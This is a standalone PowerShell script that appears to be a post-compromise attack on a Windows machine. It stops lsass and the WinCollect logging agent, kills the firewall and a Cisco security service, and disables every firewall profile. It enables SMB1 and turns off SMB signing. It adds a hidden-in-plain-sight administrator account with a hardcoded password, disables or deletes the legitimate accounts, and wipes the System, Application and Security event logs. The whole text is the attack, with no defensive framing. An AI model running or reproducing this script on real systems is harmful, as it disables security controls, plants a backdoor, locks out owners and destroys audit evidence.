Stop-Process -Name "lsass.exe"
Stop-Process -Name "WinCollectSvc.exe" -Force
Stop-Process -Name "WinCollect.exe" -Force
Stop-Service -Name "mpssvc" -Force
Stop-Service -Name "CiscoSCMS" -Force
Set-SmbServerConfiguration -EnableSMB1Protocol $true
Set-SmbServerConfiguration -EnableSMB2Protocol $false
Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false
Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled $false

$pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires $true -Description "C0MPR0M1ZED" -Disabled $false -Password $pwd -PasswordNeverExpires $true -UserMayNotChangePassword $true -Confirm $false
Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD" -Confirm $false
Disable-LocalUser -Name "algo" -Confirm $false
Disable-LocalUser -Name "Administrator" -Confirm $false
Remove-LocalUser -Name "Guest" -Confirm $false
Remove-LocalUser -Name "WDAGUtilityAccount" -Confirm $false
Remove-LocalUser -Name "DefaultAccount" -Confirm $false

Clear-EventLog -LogName System -Confirm $false
Clear-EventLog -LogName Application -Confirm $false
Clear-EventLog -LogName Security -Confirm $false
